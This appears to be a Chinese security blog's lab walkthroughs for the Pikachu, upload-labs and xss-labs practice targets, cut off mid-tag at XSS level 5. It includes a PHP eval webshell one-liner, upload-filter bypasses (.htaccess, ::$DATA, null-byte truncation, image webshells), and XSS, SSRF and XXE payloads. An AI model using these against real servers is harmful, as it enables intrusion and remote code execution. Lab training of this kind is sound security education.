因此,在web应用的开发上，除了要进行安全的代码编写，也需要注意对敏感信息的合理处理。 </p><h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>序列化serialize()<br>序列化说通俗点就是把一个对象变成可以传输的字符串,比如下面是一个对象: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class S&#123;</span><br><span class="line">    public $test=&quot;pikachu&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$s=new S(); //创建一个对象</span><br><span class="line">serialize($s); //把这个对象进行序列化</span><br><span class="line">序列化后得到的结果是这个样子的:O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;</span><br><span class="line">    O:代表object</span><br><span class="line">    1:代表对象名字长度为一个字符</span><br><span class="line">    S:对象的名称</span><br><span class="line">    1:代表对象里面有一个变量</span><br><span class="line">    s:数据类型</span><br><span class="line">    4:变量名称的长度</span><br><span class="line">    test:变量名称</span><br><span class="line">    s:数据类型</span><br><span class="line">    7:变量值的长度</span><br><span class="line">    pikachu:变量值</span><br></pre></td></tr></table></figure><p>反序列化unserialize()</p><p>就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$u=unserialize(&quot;O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;&quot;);</span><br><span class="line">echo $u-&gt;test; //得到的结果为pikachu</span><br></pre></td></tr></table></figure><p>序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">常见的几个魔法函数:</span><br><span class="line">__construct()当一个对象创建时被调用</span><br><span class="line"></span><br><span class="line">__destruct()当一个对象销毁时被调用</span><br><span class="line"></span><br><span class="line">__toString()当一个对象被当作一个字符串使用</span><br><span class="line"></span><br><span class="line">__sleep() 在对象在被序列化之前运行</span><br><span class="line"></span><br><span class="line">__wakeup将在序列化之后立即被调用</span><br><span class="line"></span><br><span class="line">漏洞举例:</span><br><span class="line"></span><br><span class="line">class S&#123;</span><br><span class="line">    var $test = &quot;pikachu&quot;;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$s = $_GET[&#x27;test&#x27;];</span><br><span class="line">@$unser = unserialize($a);</span><br><span class="line"></span><br><span class="line">payload:O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure><h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>既”xml外部实体注入漏洞”。<br>概括一下就是”攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题”<br>也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。</p><p>具体的关于xml实体的介绍,网络上有很多,自己动手先查一下。<br>现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的,从而也就直接避免了这个漏洞。<br>以PHP为例,在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。</p><p>本章提供的案例中,为了模拟漏洞,通过手动指定LIBXML_NOENT选项开启了xml外部实体解析。 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">    &lt;!ENTITY hacker &quot;ESHLkangi&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;name&gt;&amp;hacker;&lt;/name&gt;</span><br></pre></td></tr></table></figure><h1 id="URL重定向"><a href="#URL重定向" class="headerlink" title="URL重定向"></a>URL重定向</h1><p>不安全的url跳转问题可能发生在一切执行了url地址跳转的地方。<br>如果后端采用了前端传进来的(可能是用户传参,或者之前预埋在前端页面的url地址)参数作为了跳转的目的地,而又没有做判断的话<br>就可能发生”跳错对象”的问题。</p><p>url跳转比较直接的危害是:<br>–&gt;钓鱼,既攻击者使用漏洞方的域名(比如一个比较出名的公司域名往往会让用户放心的点击)做掩盖,而最终跳转的确实钓鱼网站</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.169.204/pikachu/vul/urlredirect/urlredirect.php?url=i</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.169.204/pikachu/vul/urlredirect/urlredirect.php?url=www.baidu.com</span><br></pre></td></tr></table></figure><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>SSRF(Server-Side Request Forgery:服务器端请求伪造)</p><p>其形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制<br>导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据</p><p>数据流:攻击者—–&gt;服务器—-&gt;目标地址</p><p>根据后台使用的函数的不同,对应的影响和利用方法又有不一样</p><p>PHP中下面函数的使用不当会导致SSRF:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents()</span><br><span class="line">fsockopen()</span><br><span class="line">curl_exec()</span><br></pre></td></tr></table></figure><p>如果一定要通过后台服务器远程去对用户指定(“或者预埋在前端的请求”)的地址进行资源请求,则请做好目标地址的过滤。</p><p>你可以根据”SSRF”里面的项目来搞懂问题的原因 </p><h2 id="SSRF-curl"><a href="#SSRF-curl" class="headerlink" title="SSRF(curl)"></a>SSRF(curl)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.169.204/pikachu/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info1.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.169.204/pikachu/vul/ssrf/ssrf_curl.php?url=www.baidu.com</span><br></pre></td></tr></table></figure><h2 id="SSRF-file-get-content"><a href="#SSRF-file-get-content" class="headerlink" title="SSRF(file_get_content)"></a>SSRF(file_get_content)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.169.204/pikachu/vul/ssrf/ssrf_fgc.php?file=http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info2.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.169.204/pikachu/vul/ssrf/ssrf_fgc.php?file=www.baidu.com</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs</title>
      <link href="/archives/80f02bc5.html"/>
      <url>/archives/80f02bc5.html</url>
      
        <content type="html"><![CDATA[<h1 id="靶场地址"><a href="#靶场地址" class="headerlink" title="靶场地址"></a>靶场地址</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/c0ny1/upload-labs</span><br></pre></td></tr></table></figure><h1 id="一句话"><a href="#一句话" class="headerlink" title="一句话"></a>一句话</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[123]);?&gt;</span><br></pre></td></tr></table></figure><h1 id="WebShell连接工具"><a href="#WebShell连接工具" class="headerlink" title="WebShell连接工具"></a>WebShell连接工具</h1><h2 id="中国蚁剑"><a href="#中国蚁剑" class="headerlink" title="中国蚁剑"></a>中国蚁剑</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/AntSwordProject/antSword</span><br></pre></td></tr></table></figure><h3 id="AntSword-加载器"><a href="#AntSword-加载器" class="headerlink" title="AntSword 加载器"></a>AntSword 加载器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/AntSwordProject/AntSword-Loader</span><br></pre></td></tr></table></figure><h2 id="菜刀"><a href="#菜刀" class="headerlink" title="菜刀"></a>菜刀</h2><h1 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h1><ol><li>写一个一句话文件,后缀改成允许上传的文件类型</li><li>bp抓包,把后缀改成.php</li><li>蚁剑连接<h1 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h1></li></ol><ul><li>新建后缀.php的文件</li><li>bp抓包</li><li>将Content-Type修改为允许上传的类型（image&#x2F;jpeg、image&#x2F;png、image&#x2F;gif）三选一<h1 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h1></li><li>黑名单验证</li><li>如果黑名单定义不完整的话是可以实现绕过的，用.phtml .phps .php5 .pht进行绕过。这里我们直接上传一个.php5文件</li><li>因为上传上去的文件名会改变，bp抓包数据包中有回显，所以我们还是可以访问的。<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2></li><li>要在apache的httpd.conf中有如下配置代码：AddType application&#x2F;x-httpd-php .php .phtml .phps .php5 .pht，如果不配置他是无法解析php5代码的，访问的时候就是一个空白页<h1 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h1></li><li>可以看到禁止上传文件太多了</li><li>首先创建一个.htaccess文件，里面写上代码<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;1.png&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure></li><li>这串代码的意思是如果文件中有一个1.png的文件，他就会被解析为.php.</li><li>再上传一个1.png的文件就能访问了<h2 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h2>.htaccess文件不能起名字，他就是.htaccess文件，如果你将他改为1.htaccess或者其他的什么名字是不可以的，无法解析。在实战中有可能上传上去这个文件会被自动重命名，被重命名了就不可以了。<h1 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h1></li><li>这一关没有强制将大写转换为小写，所以我们可以上传纯大写或者大小写结合的后缀名</li><li>直接上传一个后缀名为.PHP的文件,上传后或自动改名字bp抓包可以看见</li><li>我们可以看到上传成功，访问<h1 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h1><h2 id="注意-2"><a href="#注意-2" class="headerlink" title="注意"></a>注意</h2></li><li>Win下<code>xx.jpg空格</code>和<code>xx.jpg.</code>两种文件是不被允许存在的，要是这样命名文件，windows系统会默认删除<code>空格</code>或者<code>.</code></li><li>我们用burp抓包将filename&#x3D;”12345.php”改为filename&#x3D;”12345.php “(12345.php空格)<h1 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h1></li><li>和第七关思路一样，就是把空格换成点<h1 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h1></li><li>Windows本地文件系统中的文件流(File Streams)：<br>当从 Windows shell 命令行指定创建文件时，流的完整名称为 “filename:stream name:stream type”，如示例中所示： “myfile.txt:stream1:$DATA”</li><li>和上一关一样，直接上传，在数据包的php后面直接加上<code>::$DATA</code><h1 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h1></li><li>这一关的思路是它没有循环验证，也就是说这些收尾去空，删除末尾的点，去除字符串::$DATA，转换为小写这些东西只是验证了一次。</li><li>所以我们的绕过思路就很简单，在数据包中把后缀名改为<code>.php. .</code><h1 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h1></li><li>将文件名改为.pphphphpp<h1 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /upload-labs/Pass-11/index.php?save_path=../upload/%00 HTTP/1.1</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;pi .jpg&quot;</span><br></pre></td></tr></table></figure></li><li>但是有环境限制： php版本要小于5.3.4，5.3.4及以上magic_quotes_gpc需要为OFF状态<h1 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h1>跟上一关产不多 只不过是接受值变成了post,她两的差别呢就是get会自行解码，post不会自行解码，我们需要对%00进行编码,选中%00右键<h1 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h1></li><li>图片+php代码，组成一个图片码进行上传</li><li>首先制作一个图片码，可以直接用Notepad直接打开图片后面加一个php代码，但是需要16进制，要不然图片可能出错。</li><li>也可以cmd进行生成，命令语句：copy i.jpg &#x2F;b + pi.php &#x2F;a webshell.jpg</li><li>upload-labs&#x2F;include.php?file&#x3D;upload&#x2F;6520220814071149.png<h1 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h1></li><li>getimagesize函数，这个函数的意思是：会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求的</li><li>这关还是用和上关一样的方法，生成带有php代码的图片上传，配合包含漏洞拿下此关。<h1 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h1></li><li>第15关同14，13关思路一样，操作一样。但是需要打开php_exif，</li><li>exif_imagetype() 读取一个图像的第一个字节并检查其签名。<h1 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h1>本关综合判断了后缀名、content-type，以及利用imagecreatefromgif判断是否为gif图片，最后对图片再做了一次二次渲染重新创建，所以在上传图片马的时候将上传后的图片马下载下来进行查看，看看它经过而渲染后的图片中的那些数据没有改变，可以通过16进制编辑器查看，然后我们在这些没有变的地方插入一句话，这样就可以成功上传了。之后的操作与之前的关卡一样<h1 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h1>本关考察的是条件竞争 通过白名单检测后缀名，符合就rename改名，不符合就unlink删除文件 可以用burp来发包不断访问，先写一个php写入文件的1.php然后在不断访问这文件就可以看到我们上传的东西了，而且在访问这文件就可以生成另外一个shell了（通过马生成的）<h1 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h1>和上一关几乎一模一样<h1 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h1>本关考察CVE-2015-2348 move_uploaded_file() 00截断，上传webshell，同时自定义保存名称，直接保存为php是不行的,查看源码发现move_uploaded_file()函数中的img_path是由post参数save_name控制的，因此可以在save_name利用00截断绕过<h1 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h1>通过查看源码可以发现：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$file_name经过reset($file) . &#x27;.&#x27; . $file[count($file) - 1];处理。</span><br><span class="line"></span><br><span class="line">如果上传的是数组的话，会跳过$file = explode(&#x27;.&#x27;, strtolower($file));。</span><br><span class="line"></span><br><span class="line">并且后缀有白名单过滤：</span><br><span class="line"></span><br><span class="line">$ext = end($file); $allow_suffix = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);</span><br><span class="line"></span><br><span class="line">而最终的文件名后缀取的是$file[count($file) - 1]，因此我们可以让$file为数组。</span><br><span class="line"></span><br><span class="line">$file[0]为smi1e.php/，也就是reset($file)，然后再令$file[2]为白名单中的jpg。</span><br><span class="line"></span><br><span class="line">此时end($file)等于jpg，$file[count($file) - 1]为空。</span><br><span class="line"></span><br><span class="line">而 $file_name = reset($file) . &#x27;.&#x27; . $file[count($file) - 1];，也就是smi1e.php/.，最终move_uploaded_file会忽略掉/.，最终上传smi1e.php。</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS-labs</title>
      <link href="/archives/e4b595d3.html"/>
      <url>/archives/e4b595d3.html</url>
      
        <content type="html"><![CDATA[<h1 id="xss-labs"><a href="#xss-labs" class="headerlink" title="xss-labs"></a>xss-labs</h1><p>xss-labs靶场的项目地址:<a href="https://github.com/do0dl3/xss-labs">https://github.com/do0dl3/xss-labs</a></p><h1 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h1><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xss/level1.php?name=&lt;Script&gt;alert(1)&lt;/Script&gt;</span><br></pre></td></tr></table></figure><h1 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h1><p>源码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href=&quot;level3.php?writing=wait&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level2&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level2&lt;/h1&gt;</span><br><span class="line">&lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt;</span><br><span class="line">&lt;form action=level2.php method=GET&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;input name=keyword  value=&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&lt;center&gt;&lt;img src=level2.png&gt;&lt;/center&gt;</span><br><span class="line">&lt;h3 align=center&gt;payload的长度:25&lt;/h3&gt;&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>这里变量出现在两处，我们直接利用第二处，做构造以及闭合</p><hr><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;&gt;&lt;ScRipt&gt;alert(1)&lt;/ScRipt&gt;</span><br></pre></td></tr></table></figure><h1 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h1><ul><li>看一下网页源代码和php代码,使用了htmlspecialchars方法</li><li>htmlspecialchars的解释  <a href="https://www.w3school.com.cn/php/func_string_htmlspecialchars.asp">https://www.w3school.com.cn/php/func_string_htmlspecialchars.asp</a>  就是HTML为了防止特殊符号，如 “&lt;”等，html当成标签</li><li>这时候我们的思路就尽量要绕开使用新标签，那么浏览器还有一些事件可以执行js代码，如onfocus，onblur，但是这两个是属于输入框在光标进入&#x2F;离开时调用后面的js代码（可以用函数形式或者javascript:~~）,这里我用的是click，直接点击一下就可以了  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href=&quot;level4.php?keyword=try harder!&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level3&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level3&lt;/h1&gt;</span><br><span class="line">&lt;h2 align=center&gt;没有找到和&#x27;onfocus=javascript:alert(&#x27;xss&#x27;) &amp;gt; /相关的结果.&lt;/h2&gt;&lt;center&gt;</span><br><span class="line">&lt;form action=level3.php method=GET&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;input name=keyword  value=&#x27;&#x27;onfocus=javascript:alert(&#x27;xss&#x27;) &amp;gt; /&#x27;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&lt;center&gt;&lt;img src=level3.png&gt;&lt;/center&gt;</span><br><span class="line">&lt;h3 align=center&gt;payload的长度:36&lt;/h3&gt;&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li></ul><hr><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick =&#x27;javascript:alert(1)&#x27;//</span><br></pre></td></tr></table></figure><ul><li>再次点击搜索框<h1 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h1></li><li>同第三关（把单引号换成双引号）<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href=&quot;level5.php?keyword=find a way out!&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level4&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level4&lt;/h1&gt;</span><br><span class="line">&lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt;</span><br><span class="line">&lt;form action=level4.php method=GET&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;input name=keyword  value=&quot;scriptalert(1)/script&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&lt;center&gt;&lt;img src=level4.png&gt;&lt;/center&gt;</span><br><span class="line">&lt;h3 align=center&gt;payload的长度:21&lt;/h3&gt;&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li></ul><hr><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick =&#x27;javascript:alert(1)&#x27;//</span><br></pre></td></tr></table></figure><ul><li>再次点击搜索框<h1 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href=&quot;level6.php?keyword=break it out!&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level5&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level5&lt;/h1&gt;</span><br><span class="line">&lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt;</span><br><span class="line">&lt;form action=level5.php method=GET&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;input name=keyword  value=&quot;&lt;scr_ipt&gt;alert(1)&lt;/script&gt;&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&lt;center&gt;&lt;img 